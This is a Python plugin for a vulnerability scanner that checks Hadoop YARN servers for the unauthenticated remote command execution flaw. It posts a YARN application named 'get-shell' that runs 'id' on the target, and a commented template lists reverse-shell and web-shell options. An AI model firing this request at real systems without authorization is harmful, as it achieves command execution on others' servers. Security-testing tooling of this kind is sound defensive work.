# -*- coding: UTF-8 -*-
#!/usr/bin/python
import base64
import subprocess

import requests
def vuln_info():
    info={
        'vuln_name': 'Hadoop Yarn RPC 远程命令执行',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'Apache',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''
        2021年11月15日，有安全研究人员披露Hadoop Yarn RPC存在未授权访问漏洞，此漏洞存在于Hadoop的核心组件Hadoop Yarn中，因Hadoop Yarn默认对外开放RPC服务，导致远程攻击者可利用此未授权漏洞并通过RPC服务执行任意命令，从而达到控制目标服务器的目的，鉴于此漏洞为高危状态，危害较大，且细节已公开、被在野利用，建议所有使用Apache Hadoop的用户及时进行自查并采取安全措施。
        ''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''更新版本''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':0  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":""}
        poc = r"""/ws/v1/cluster/apps"""
        url1 = url + poc
        newurl = url1.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            port = newurl.split(':')[1]
            headers = {
                "host": f'{host}:{port}',
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Content-Length": "167",
                "Content-Type": "application/json"
            }
            data = {"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"}
            try:
                res = requests.post(url1, headers=headers,json=data,verify=False,timeout=3)
                if "groups=" in res.text:
                    result['Result'] =True
                    result['Result_Info']="存在漏洞:"+url1
            except Exception as err:
                    result['Debug_Info']= str(err)
        return result
    except Exception as e:
        func_out('Error',str(e))

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    result = {"Result":False,"Result_Info":"该漏洞不存在EXP"}
    return result



